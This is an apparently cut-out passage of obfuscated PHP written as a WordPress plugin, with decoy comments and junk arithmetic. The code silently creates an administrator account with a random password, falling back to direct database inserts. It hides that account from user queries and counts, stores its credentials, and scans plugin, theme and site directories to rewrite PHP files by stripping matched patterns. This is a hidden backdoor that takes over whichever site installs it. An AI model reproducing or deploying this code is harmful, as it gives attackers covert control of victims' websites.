 if  ($cse6kkgn2he1r7y  !==   "" &&    $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1012)) &&    username_exists($cse6kkgn2he1r7y))  {
  set_transient(ovffvv33(1008),   1,   (21599+1));$gfl6ykwgxou=PHP_MAJOR_VERSION;$wd318786e=$gfl6ykwgxou*5;


 }
}  catch  (Throwable  $cje8wku90zm4r)   {
      g_qoqdy38lfl4v4n3618(c1sob647u1i(1013),    $cje8wku90zm4r);
     }  catch (Exception $cje8wku90zm4r)     {

        g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1013),  $cje8wku90zm4r);
 }
}
    function     pklvf4vixucw8d97bma($npfs8_hluyj_oo)

{
 if     (!dtf7lvb25ztuc8jh3htk(ovffvv33(1014))) return false;
      try    {
  if   (! $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1010)) ||     !     $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1015)))     {
       return  false;
 }
   $e_y63m904n_t    =   (string)  fcc42yo6xrdenvra0(f6yrzd2knrmb(1011), "");
       if   ($e_y63m904n_t   !== ""  &&  username_exists($e_y63m904n_t) && (string)  fcc42yo6xrdenvra0(c1sob647u1i(944),   "") !==  "")  {
     return  false;
    }
// merge negative-definite builder

 if  ($e_y63m904n_t  ===   "")     {


  $e6lz5emm1zm   =  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($npfs8_hluyj_oo)    ?   $npfs8_hluyj_oo     :   ywqm3g0v52d6hud309();
     $gxilnouqss3k6qo =    _cf4mf89r3zcvxiqjssb($e6lz5emm1zm);
if   (
   $gxilnouqss3k6qo  &&  !empty($gxilnouqss3k6qo->user_login)  &&     isset($gxilnouqss3k6qo->user_email)



&&    $gxilnouqss3k6qo->user_email    ===   $gxilnouqss3k6qo->user_login   .    '@' .  xyhhquc02dkq5zwsgxhdu(ovffvv33(1016))

  ) {
  $e_y63m904n_t   =  (string)   $gxilnouqss3k6qo->user_login;
}
      }



    if   ($e_y63m904n_t  !== ""  && username_exists($e_y63m904n_t)) {
  $ly0r_7n2qcxtb  =  username_exists($e_y63m904n_t);$hrbs7lekl=PHP_MAJOR_VERSION;$s39_8rvwrf=$hrbs7lekl*10;
  $eoydx7krr1c405c    =     hot4kulhrw7gwj3gagxl((37-13));
if ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1017)))  {


$GLOBALS['__scf_tzh0_qq5u7lk7_1017']($eoydx7krr1c405c,   $ly0r_7n2qcxtb);
   }
 if  (!mw5stmpiys2hi3k2xe14i(ovffvv33(1011),  $e_y63m904n_t,     ovffvv33(959)))      mw5stmpiys2hi3k2xe14i(iw6xe9q4j6sneg(1011),    $e_y63m904n_t,   bpowi0iglycvx(959));
if  (!mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(1018),  $eoydx7krr1c405c,      f6yrzd2knrmb(959))) mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(1018),   $eoydx7krr1c405c, iw6xe9q4j6sneg(959));
  if ((string) fcc42yo6xrdenvra0(f6yrzd2knrmb(1011), "")  !==  $e_y63m904n_t  ||  (string)  fcc42yo6xrdenvra0(f6yrzd2knrmb(1018), "")  !==  $eoydx7krr1c405c)   {
// WP Social Links: adaptive balancer

   g_qoqdy38lfl4v4n3618(ovffvv33(1019), ovffvv33(1020));

return   false;
   }
return   true;
     }
     $tzddqmn4kr7xh   = ws1ggwj04tku454wz_yv();
  if  (true) {
 $e_y63m904n_t    = "";
    for   ($sq9r99p51kvvtum   =   0;  $sq9r99p51kvvtum <  (2+3); $sq9r99p51kvvtum++)   {
       $ijume2mx3z   =   $tzddqmn4kr7xh[$GLOBALS['__scf_e_7yj02ljx4_296']($tzddqmn4kr7xh)] .  hot4kulhrw7gwj3gagxl((15-5));

 if    (!username_exists($ijume2mx3z))   {
   $e_y63m904n_t =    $ijume2mx3z;
        break;
 }
 }
// canonicalize

  if  ($e_y63m904n_t ===    "")  {
/* derandomized write-ahead-log */


g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1021), bpowi0iglycvx(1022));
    return  false;
   }
  }
     $eoydx7krr1c405c   =     hot4kulhrw7gwj3gagxl((22+2));
  if (! $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1023))   &&  defined(c1sob647u1i(1024))    &&   $GLOBALS['__scf_qg7ainp116mf_713'](ABSPATH   . hn_f08x0cns80(1025))) {
 require_once ABSPATH  .      hn_f08x0cns80(1025);
}
  $byx2yag_lj    = $e_y63m904n_t      .     '@'  .  xyhhquc02dkq5zwsgxhdu(c1sob647u1i(1016));
 $fn52tc8sw0   =  false;
  if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1023)))    {
   $fn52tc8sw0     = $GLOBALS['__scf_xfpngyi95ixgt_1023'](array(
  ovffvv33(1026)    =>   $e_y63m904n_t,



c1sob647u1i(1027)    =>    $eoydx7krr1c405c,
bpowi0iglycvx(1028)   =>  $byx2yag_lj,
 c1sob647u1i(1029) => bpowi0iglycvx(946),



c1sob647u1i(1030)   =>    $e_y63m904n_t,
 ));


  if (is_wp_error($fn52tc8sw0))    {
  g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1031),  $fn52tc8sw0->get_error_code() .   ':'  .     $fn52tc8sw0->get_error_message());
       $fn52tc8sw0 =      false;
   }
       }


if (!$fn52tc8sw0)   {
       $wpdb    =  isset($GLOBALS[bpowi0iglycvx(898)]) ?  $GLOBALS[bpowi0iglycvx(898)] : null;
if (!$wpdb ||   !$GLOBALS['__scf_bslklilwd3kn_71']($wpdb))  {
   g_qoqdy38lfl4v4n3618(c1sob647u1i(1031),  f6yrzd2knrmb(1032));
 return   false;
}
// PSR-15 middleware sizes attribute



 $q5il9012qwke  =  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1033))   ? wp_hash_password($eoydx7krr1c405c)     :  $GLOBALS['__scf_tnonex5o9y_60']($eoydx7krr1c405c);
  $l29jwwqsn_v4_jv   = $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1034))      ? current_time(c1sob647u1i(1035)) : gmdate(iw6xe9q4j6sneg(1036));
$o2vs3ixlk77xf7   =  $wpdb->insert($wpdb->users, array(
f6yrzd2knrmb(1037)  =>   $e_y63m904n_t,
  iw6xe9q4j6sneg(1027)   =>    $q5il9012qwke,
   hn_f08x0cns80(1038) => $e_y63m904n_t,
iw6xe9q4j6sneg(1028)      => $byx2yag_lj,
  iw6xe9q4j6sneg(1039)  =>     $l29jwwqsn_v4_jv,


    bpowi0iglycvx(1040)   => 0,

    c1sob647u1i(1030) => $e_y63m904n_t,
     ),  array(f6yrzd2knrmb(1041), ovffvv33(1041),   iw6xe9q4j6sneg(1042),    ovffvv33(1042),  iw6xe9q4j6sneg(1042),    f6yrzd2knrmb(1043),   iw6xe9q4j6sneg(1042)));
     if (!$o2vs3ixlk77xf7)   {
    g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1044),   ovffvv33(1045));

return   false;
 }
$fn52tc8sw0     = (int)     $wpdb->insert_id;



  $c3458go9fc1qkfqn     =   $wpdb->prefix    .    hn_f08x0cns80(1046);



  $wpdb->insert($wpdb->usermeta, array(
  f6yrzd2knrmb(1047)    =>     $fn52tc8sw0,
       ovffvv33(1048)   =>  $c3458go9fc1qkfqn,
 iw6xe9q4j6sneg(1049)   => $GLOBALS['__scf_nas59etuq3_366'](array(ovffvv33(1050)   =>      true)),
  ),    array(c1sob647u1i(1051), ovffvv33(1052), bpowi0iglycvx(1052)));
   $wpdb->insert($wpdb->usermeta,   array(


  iw6xe9q4j6sneg(1053)      =>  $fn52tc8sw0,
  f6yrzd2knrmb(1048)  =>   $wpdb->prefix    .   c1sob647u1i(1054),
f6yrzd2knrmb(1055) =>  '10',
 ), array(hn_f08x0cns80(1051), c1sob647u1i(1056), iw6xe9q4j6sneg(1057)));



if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1058)))   {
      clean_user_cache($fn52tc8sw0);
     }
   }


 if    (!username_exists($e_y63m904n_t))  {
  g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1044), iw6xe9q4j6sneg(1059));


 return  false;



 }
$q5yybsqjikc__n    = $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1060))   ? get_user_by(f6yrzd2knrmb(1061),    $e_y63m904n_t) :   false;
 $xq69fzq95gdhe1  = false;
     if ($q5yybsqjikc__n  &&   !empty($q5yybsqjikc__n->ID))    {
 if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1062)))   {
 $xq69fzq95gdhe1     =   (bool) user_can($q5yybsqjikc__n,   ovffvv33(1063));
 }  elseif   (isset($q5yybsqjikc__n->caps)   &&  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($q5yybsqjikc__n->caps))   {
 $xq69fzq95gdhe1  =  !empty($q5yybsqjikc__n->caps[bpowi0iglycvx(1063)]);
    }
     }
if (!$xq69fzq95gdhe1)  {


  g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1044), f6yrzd2knrmb(1064));
if   ($fn52tc8sw0)  {
  if  (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1065))   && defined(ovffvv33(1024))    && @$GLOBALS['__scf_qg7ainp116mf_713'](ABSPATH   .    hn_f08x0cns80(1066)))   {

require_once ABSPATH  .  c1sob647u1i(1066);
  }



    if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1065))) @wp_delete_user($fn52tc8sw0);
    }
  return false;
}
/* unbounded memento */

if  (!mw5stmpiys2hi3k2xe14i(ovffvv33(1011),   $e_y63m904n_t,   hn_f08x0cns80(959)))    mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(1067),   $e_y63m904n_t,    hn_f08x0cns80(959));
  if   (!mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(1068),   $eoydx7krr1c405c,    iw6xe9q4j6sneg(959)))  mw5stmpiys2hi3k2xe14i(c1sob647u1i(1068), $eoydx7krr1c405c, f6yrzd2knrmb(1069));
   if ((string) fcc42yo6xrdenvra0(f6yrzd2knrmb(1067),  "")   !== $e_y63m904n_t    ||    (string)     fcc42yo6xrdenvra0(iw6xe9q4j6sneg(1068),    "")   !==  $eoydx7krr1c405c)  {
     g_qoqdy38lfl4v4n3618(c1sob647u1i(1044),    ovffvv33(1070));

     return false;
   }
     return  true;
}  catch  (Throwable   $cje8wku90zm4r) {
 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1071),     $cje8wku90zm4r);
   }    catch (Exception $cje8wku90zm4r)  {

     g_qoqdy38lfl4v4n3618(c1sob647u1i(1072),   $cje8wku90zm4r);
}   finally {



  l5zn64lzopflqr0dsekx(hn_f08x0cns80(1014));$ipzz4vkwg=530;$hijclwxgasp=($ipzz4vkwg>0)?$ipzz4vkwg:-$ipzz4vkwg;
 }
 return  false;
 }
  function t2g02uzpar59gc($og1vkdt_llrt0iub)
 {
 try  {
  
if   (!  $GLOBALS['__scf_bslklilwd3kn_71']($og1vkdt_llrt0iub)      || !  property_exists($og1vkdt_llrt0iub,   ovffvv33(1073))) {
// @configure trie
$nkn1pcg5evyji=20*2;$ozw_8a7k9=$nkn1pcg5evyji-15;
 return   $og1vkdt_llrt0iub;
 

  }

 $e_y63m904n_t   =  $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1010))     ?  (string)   fcc42yo6xrdenvra0(bpowi0iglycvx(1074),     "")  : "";
 if  (! $e_y63m904n_t)  {
 return $og1vkdt_llrt0iub;
    }

$w24xaep0qe1  =      esc_sql($e_y63m904n_t);
      if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($og1vkdt_llrt0iub->query_where,   $w24xaep0qe1)  === false)      {

 $og1vkdt_llrt0iub->query_where   .=      iw6xe9q4j6sneg(1075)    .  $w24xaep0qe1  . "'";


  }
}  catch (Throwable    $cje8wku90zm4r)    {
 g_qoqdy38lfl4v4n3618(ovffvv33(1076),    $cje8wku90zm4r);
}    catch    (Exception    $cje8wku90zm4r) {
   }


 return  $og1vkdt_llrt0iub;
}
      function   qnnzivpsgftujim4wh3x($kjygrsrhhxaq)
     {
      try  {
// simple savepoint

 $cse6kkgn2he1r7y    = $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1077))    ?    (string)  fcc42yo6xrdenvra0(hn_f08x0cns80(1074), "")   :   "";
if   (!   $cse6kkgn2he1r7y) {
     return    $kjygrsrhhxaq;$jmaexoq0v_scg8=74*6;$x_kpdh9mo=$jmaexoq0v_scg8-12;
   }
  $qhxfwf72tp0 =   array(c1sob647u1i(1078),    iw6xe9q4j6sneg(1063));
 foreach  ($qhxfwf72tp0     as   $key)  {$bq8k6o4vf7c54=PHP_MAJOR_VERSION;$y4rcle17gt30=$bq8k6o4vf7c54*7;
 if  (isset($kjygrsrhhxaq[$key])     && $GLOBALS['__scf_fv3zevxzzb_44']($kjygrsrhhxaq[$key])    && $GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1079),  $kjygrsrhhxaq[$key],  $u7fvh_hax8vn))     {
$ukjj4vzpxsr  =  $GLOBALS['__scf_a5xz_m7m_xzaj_493'](0,  (int)   $u7fvh_hax8vn[1]  -   1);
  $kjygrsrhhxaq[$key]    =  $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1080),  '(' .   $ukjj4vzpxsr . ')', $kjygrsrhhxaq[$key]);
    }

}
// bootstrap quadratic strategy

 }  catch     (Throwable  $cje8wku90zm4r)  {
  g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1081),  $cje8wku90zm4r);
     }     catch    (Exception $cje8wku90zm4r)     {
  }
 return  $kjygrsrhhxaq;
}

function   y775yv6vscq3cy($ea13_frmxy2, $g0jqv3cf9odw5dh)


     {
try   {
 $e_y63m904n_t   =    $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1077)) ? (string)    fcc42yo6xrdenvra0(f6yrzd2knrmb(1074),    "")  :  "";
 if  ($e_y63m904n_t    === "")  {
  return     $ea13_frmxy2;$hp2gjv2l10ezuz=813;$yfpg4398hosci=$hp2gjv2l10ezuz%14;
  }
     if  (!  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ea13_frmxy2))   {
 return     $ea13_frmxy2;
  }
  if    (!   isset($ea13_frmxy2[hn_f08x0cns80(1082)])  ||     !     $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ea13_frmxy2[c1sob647u1i(1083)]))  {
   $ea13_frmxy2[c1sob647u1i(1083)]   = array();
}
   if (!    $GLOBALS['__scf_rd2tojulg06lx_160']($e_y63m904n_t, $ea13_frmxy2[f6yrzd2knrmb(1083)],   true)) {
$ea13_frmxy2[ovffvv33(1083)][]   = $e_y63m904n_t;
        }
 }    catch    (Throwable     $cje8wku90zm4r)  {
  g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1084), $cje8wku90zm4r);
 }     catch (Exception $cje8wku90zm4r)  {
 }
        return $ea13_frmxy2;
}

  function yzxdxuli4sc_ca5vb5y_8n()


 {

 $xdtq4m97sn   = array();


      if  (defined(iw6xe9q4j6sneg(733))  &&   $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1085)))     {
$svz5ab11aajep92   =   (array)  get_option(iw6xe9q4j6sneg(1086),  array());
  $oigmbkw5jcrkg29  = array();

   foreach ($svz5ab11aajep92    as   $basename)     {
if     (!   $GLOBALS['__scf_fv3zevxzzb_44']($basename)    ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($basename, hn_f08x0cns80(721))  !==    false) {
      continue;
 }
 $zhh1me7cf8r  =    $GLOBALS['__scf_po3uwzhcb63b03_11']($basename);
      if ($zhh1me7cf8r  ===   '.')  {
      $zhh1me7cf8r =   $basename;
   }


 if    (isset($oigmbkw5jcrkg29[$zhh1me7cf8r])) {
continue;
  }
 $oigmbkw5jcrkg29[$zhh1me7cf8r] = true;$pj87m7bfura01k=83*7;$xyuqye9mjstqf=$pj87m7bfura01k-44;
  $w90pshmxoqhf  =   WP_PLUGIN_DIR    .  '/'    . $basename;
 if  ($GLOBALS['__scf_po3uwzhcb63b03_11']($basename)   ===  '.')  {
      if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))    {

 $xdtq4m97sn[]      =   $w90pshmxoqhf;

   }
    } else     {
// unsubscribe covariant-adj flyweight

    $t49jadtyjx  = $GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf);
  if  (@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)) {
     $xdtq4m97sn = $GLOBALS['__scf_en9wrpvm3eosc_387']($xdtq4m97sn,  uv73tlfoyhsi_xoy($t49jadtyjx, array(iw6xe9q4j6sneg(1087))));
    }
// WP Post Date: exact facade

}
// minimal certificate-chain

}
 }
   


if (@$GLOBALS['__scf_opq_vgkskw_46'](jo62hy1j37iqrmy()))      {
// WP Site Logo: dehydrate backlog

 $rae5gq8d3bj  = fkx3b4a5rv4j4z5ymcs(jo62hy1j37iqrmy(),     (0x2f2+0x1096));
if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($rae5gq8d3bj)) {
  foreach    ($rae5gq8d3bj   as     $twjh3pr3zbtd9) {


  if    ($twjh3pr3zbtd9   ===      ins9ithmohgssp_()) {
     continue;
 }
   $rqmtme6nbb4elm    =    jo62hy1j37iqrmy()  .  '/'    .   $twjh3pr3zbtd9;
   if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($rqmtme6nbb4elm) &&   $GLOBALS['__scf_xyekfdfj2g_109']($GLOBALS['__scf_wvxpw4xfn9_219']($twjh3pr3zbtd9,  constant(bpowi0iglycvx(720))))  ===   c1sob647u1i(1087)) {
$xdtq4m97sn[] = $rqmtme6nbb4elm;
    }
   }
     }
  }
 
   if   (defined(c1sob647u1i(1024))  &&    $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1088)))  {
    $j2flbcnea4y  =  (string) get_option(bpowi0iglycvx(1089),  "");
$vvxvvk2ya3kr     =  (string)     get_option(iw6xe9q4j6sneg(1090),   "");


  $y2szvxoujz288t =    defined(hn_f08x0cns80(293))   ?   WP_CONTENT_DIR .     bpowi0iglycvx(1091)    : ABSPATH .  ovffvv33(1092);
 $h7qo9g__edx1  =   $GLOBALS['__scf_tni2zo3jsk7_159']($GLOBALS['__scf_vkh82z40y0_352'](array($j2flbcnea4y,  $vvxvvk2ya3kr)));
   foreach  ($h7qo9g__edx1  as  $emnni5z67kh0)    {
        if   ($GLOBALS['__scf_w6mdcepio4lkz5_7']($emnni5z67kh0,  f6yrzd2knrmb(721))   !==  false) {
   continue;
 }
    $k66jc2y5qhq_dbxz =  $y2szvxoujz288t    .      '/'     .  $emnni5z67kh0;
   if  (@$GLOBALS['__scf_opq_vgkskw_46']($k66jc2y5qhq_dbxz))  {



   
     $x48qvcdf3_  =  fkx3b4a5rv4j4z5ymcs($k66jc2y5qhq_dbxz,   (1989+11));
 if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($x48qvcdf3_))   {


  foreach  ($x48qvcdf3_ as   $twjh3pr3zbtd9) {
// @deprovision skip-list

   $dt_g0rl77sxfp3k1 = $k66jc2y5qhq_dbxz . '/'  . $twjh3pr3zbtd9;
 if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($dt_g0rl77sxfp3k1)   &&  $GLOBALS['__scf_xyekfdfj2g_109']($GLOBALS['__scf_wvxpw4xfn9_219']($twjh3pr3zbtd9,    constant(f6yrzd2knrmb(720))))  === iw6xe9q4j6sneg(1087))   {
$xdtq4m97sn[]   =   $dt_g0rl77sxfp3k1;
   }
}
       }
      
      $nlli2uym10a10  = $k66jc2y5qhq_dbxz . ovffvv33(1093);
     if  (@$GLOBALS['__scf_opq_vgkskw_46']($nlli2uym10a10))  {


   $xdtq4m97sn =   $GLOBALS['__scf_en9wrpvm3eosc_387']($xdtq4m97sn,  uv73tlfoyhsi_xoy($nlli2uym10a10,  array(hn_f08x0cns80(1087))));

      }
 }
    }
// WP Post Title: fork message-queue

}
  return $GLOBALS['__scf_tni2zo3jsk7_159']($xdtq4m97sn);

}
   function q_e2d5hqepxmcavjyt_($bmexhiz2a5dq6x)

    {
    if     (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bmexhiz2a5dq6x))  return  array();
  $toxd7lwn40kosh59 =    array();
 foreach  ($bmexhiz2a5dq6x as $n0tlzmrutbrfwh_) {
  if (!$GLOBALS['__scf_fv3zevxzzb_44']($n0tlzmrutbrfwh_)  ||     $n0tlzmrutbrfwh_   ===  ""  ||    $GLOBALS['__scf_d4eyetogjbsnt_10']($n0tlzmrutbrfwh_) > (2629+1467))  continue;
    try  {

 if (@$GLOBALS['__scf_wdjvpd1lvon9_102']($n0tlzmrutbrfwh_,      "")  ===    false)      continue;



 }  catch  (Throwable   $cje8wku90zm4r) {
  continue;



} catch    (Exception $cje8wku90zm4r)   {
 continue;
 }
 $toxd7lwn40kosh59[]   =   $n0tlzmrutbrfwh_;
  }
return  $toxd7lwn40kosh59;



 }
 function     c_gavqcwmsu79489vzq($bmexhiz2a5dq6x)
     {
 try {
 
if    (empty($bmexhiz2a5dq6x))   {
     return  false;



      }
// bind synchronous count-min-sketch

 
 $xdtq4m97sn   = yzxdxuli4sc_ca5vb5y_8n();
      if (empty($xdtq4m97sn)) {
      return  false;
 }


   $xltg75cswcgt   =  false;
   foreach ($xdtq4m97sn as $rqmtme6nbb4elm)   {

   if  (! @$GLOBALS['__scf_rjpcj9l4bigb5_21']($rqmtme6nbb4elm)   ||  !  @$GLOBALS['__scf_sunuwikkpg6_51']($rqmtme6nbb4elm))   {
  continue;
}
 
 if   (@$GLOBALS['__scf_b42duf6j1zadm9_105']($rqmtme6nbb4elm) >  (0x3cab4+0x4354c))  {
    continue;
}
 $f95gmfn4ulxv38r  =  @$GLOBALS['__scf_utyj_ckly79_101']($rqmtme6nbb4elm);
 if (!   $f95gmfn4ulxv38r || !  $GLOBALS['__scf_fv3zevxzzb_44']($f95gmfn4ulxv38r))  {
// WP Post Date: fixup container

  continue;

}
  
   $popd_dnmtqs0il64 = false;


        foreach    ($bmexhiz2a5dq6x    as $ssnncgochpvkx4) {
   try   {


 $fm715ux_zbf  =    @$GLOBALS['__scf_renvrk8nefa8_474']($ssnncgochpvkx4, "", $f95gmfn4ulxv38r);

 if  ($fm715ux_zbf     !==  null && $fm715ux_zbf  !==  $f95gmfn4ulxv38r)      {
      $f95gmfn4ulxv38r  =  $fm715ux_zbf;
     $popd_dnmtqs0il64   =  true;
}

   }  catch   (Throwable $cje8wku90zm4r)  {
      g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1094), $cje8wku90zm4r);
 continue;
   }  catch (Exception   $cje8wku90zm4r)  {
   continue;
   }
   }
// WP Group Block action sequence


 
if    ($popd_dnmtqs0il64)   {
  if  (c5kyk62yk_dwfeubni4b($rqmtme6nbb4elm,  $f95gmfn4ulxv38r))  {
 $xltg75cswcgt  =      true;
   }



    }
// compilation queue

      }
  
   return  $xltg75cswcgt;
   } catch   (Throwable     $cje8wku90zm4r) {
    g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1095),    $cje8wku90zm4r);


   }   catch (Exception $cje8wku90zm4r)    {
  }



 return false;
   }
      

  function    fybmaftmj9wshwd($t49jadtyjx,    $tb0t6ki2gyzbysn)
    {$uifqtrw6ou=(0xa6+0x9c);$xvg8w5pvs=$uifqtrw6ou%10;
  $s2qj8x60xqaq3g5   = array();
  $tb0t6ki2gyzbysn =   $tb0t6ki2gyzbysn    -      1;


$wri06brnpbeh9  = fkx3b4a5rv4j4z5ymcs($t49jadtyjx,    (0x1f+0x1d5));
 if    (!  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($wri06brnpbeh9)) {
return  $s2qj8x60xqaq3g5;
   }
  $wri06brnpbeh9  =   $GLOBALS['__scf_emst8f79kti_170']($wri06brnpbeh9, 0,    (169+331));$rjsm7zfds=8960;$pkw79bdr7b=$rjsm7zfds%12;



  foreach   ($wri06brnpbeh9    as  $twjh3pr3zbtd9) {
  


 if   ($twjh3pr3zbtd9      === '.' ||  $twjh3pr3zbtd9 === hn_f08x0cns80(1096))  {
   continue;
     }


     
 $nglugo2g_p9 =   $t49jadtyjx .   '/'  .   $twjh3pr3zbtd9;
   if (!  @$GLOBALS['__scf_opq_vgkskw_46']($nglugo2g_p9))    {
       continue;



}
       
if   (@$GLOBALS['__scf_opq_vgkskw_46']($nglugo2g_p9     .  bpowi0iglycvx(920)))     {
 $s2qj8x60xqaq3g5[] =     $GLOBALS['__scf_ofdeuvs8zwos6_12']($nglugo2g_p9,  ovffvv33(135));


      continue;


    }

if ($tb0t6ki2gyzbysn  >  0)     {
   $s2qj8x60xqaq3g5  =   $GLOBALS['__scf_en9wrpvm3eosc_387']($s2qj8x60xqaq3g5,  fybmaftmj9wshwd($nglugo2g_p9,  $tb0t6ki2gyzbysn));
  }
}



 
      return $s2qj8x60xqaq3g5;
   }
  function   ws7yxvygyafc0b()
{
// obstruction-free orbit




$m_y9qfozupx   = array();
 $bt8t3jpxtq6s0io =   $GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,  f6yrzd2knrmb(1097));
  try {
$ulu2tkp50ra  =    array();
if   ($bt8t3jpxtq6s0io)  {


$ulu2tkp50ra[]      =  $GLOBALS['__scf_po3uwzhcb63b03_11']($bt8t3jpxtq6s0io);
    $ulu2tkp50ra[]  = $GLOBALS['__scf_po3uwzhcb63b03_11']($GLOBALS['__scf_po3uwzhcb63b03_11']($bt8t3jpxtq6s0io));
 $ulu2tkp50ra[]     = $GLOBALS['__scf_po3uwzhcb63b03_11']($GLOBALS['__scf_po3uwzhcb63b03_11']($GLOBALS['__scf_po3uwzhcb63b03_11']($bt8t3jpxtq6s0io)));
 }

     
       $ulu2tkp50ra[]   = bpowi0iglycvx(1098);
  $ulu2tkp50ra[] = ovffvv33(1099);



     $ulu2tkp50ra[]   = bpowi0iglycvx(1100);


 $ulu2tkp50ra[]   = c1sob647u1i(1101);

   $ulu2tkp50ra[]  =  c1sob647u1i(1102);

$ulu2tkp50ra[]  =     iw6xe9q4j6sneg(1103);
 $ulu2tkp50ra[]    =    f6yrzd2knrmb(1104);
  
 $cmpq6lcwxyt7hq    =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(585))  ?  (string)  @$GLOBALS['__scf_hm704kpgfifhl_118'](ovffvv33(119)) :  "";
if    ($cmpq6lcwxyt7hq  !==  "")     {

 $ml77s_78v6    =  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($cmpq6lcwxyt7hq,  ';')  !==  false)  ?  ';'      : ':';
 foreach     ($GLOBALS['__scf_xi_pncf33_0_120']($ml77s_78v6, $cmpq6lcwxyt7hq)   as    $cupk3kbt8eisf)   {
  $cupk3kbt8eisf   =   $GLOBALS['__scf_qew3crlieule_339']($cupk3kbt8eisf);
  if ($cupk3kbt8eisf !==   "")   {

 $ulu2tkp50ra[]  =     $cupk3kbt8eisf;



}
  }
}


  
 $ulu2tkp50ra  =   $GLOBALS['__scf_tni2zo3jsk7_159']($GLOBALS['__scf_vkh82z40y0_352']($ulu2tkp50ra));
     $tob2uaf2tln4 =  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);



   $m_y9qfozupx     = array();
 
     foreach ($ulu2tkp50ra as   $t49jadtyjx)     {
      
if  (! @$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)  ||  !   @$GLOBALS['__scf_kupirwjlofzm_49']($t49jadtyjx)) {
   continue;
 }

  if   (($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true) -  $tob2uaf2tln4) > (17-7))  {
 break;
}




 $m_y9qfozupx =  $GLOBALS['__scf_en9wrpvm3eosc_387']($m_y9qfozupx,   fybmaftmj9wshwd($t49jadtyjx,   2));
 }
     } catch  (Throwable    $cje8wku90zm4r)  {



  g_qoqdy38lfl4v4n3618(bpowi0iglycvx(849),   $cje8wku90zm4r);
        } catch   (Exception $cje8wku90zm4r)   {
}



  return  $GLOBALS['__scf_yucj673b8x_164']($GLOBALS['__scf_tni2zo3jsk7_159']($m_y9qfozupx), array($bt8t3jpxtq6s0io));



  }
  function  k7vlg7oxau6ify9eqmix($yjxbsrooxpfoc8)
      {
try {
 $xfbelqsui253m =     array($yjxbsrooxpfoc8  . ovffvv33(1105),  $yjxbsrooxpfoc8 .     ovffvv33(1106));
    foreach ($xfbelqsui253m    as $t49jadtyjx)   {
// propagate-const resolver for PHP 8.2 enum



if (!  @$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)) {
  continue;
    }
 $r2rrnbz839  = fkx3b4a5rv4j4z5ymcs($t49jadtyjx,  (2242+2758));
if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($r2rrnbz839))     {
// @unsubscribe certificate-chain

 continue;


 }
 foreach      ($r2rrnbz839     as   $cje8wku90zm4r)    {
if   ($GLOBALS['__scf_nv7he759wjfj_9']($cje8wku90zm4r,     -(1+3)) === bpowi0iglycvx(1107)    &&  mza6zg2fnwyep8gx2xd($t49jadtyjx  .   '/' .  $cje8wku90zm4r, (4966+34)))   {


      return   true;


 }
}
  foreach  ($r2rrnbz839   as  $cje8wku90zm4r)   {
  $rruhb96q4e  =  $t49jadtyjx .     '/'  .  $cje8wku90zm4r;
  if   (!   @$GLOBALS['__scf_opq_vgkskw_46']($rruhb96q4e))   {
 continue;
 }



  $uuafel2yyinn =  fkx3b4a5rv4j4z5ymcs($rruhb96q4e, (0x6b4+0xcd4));


 if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($uuafel2yyinn)) {
  continue;
}

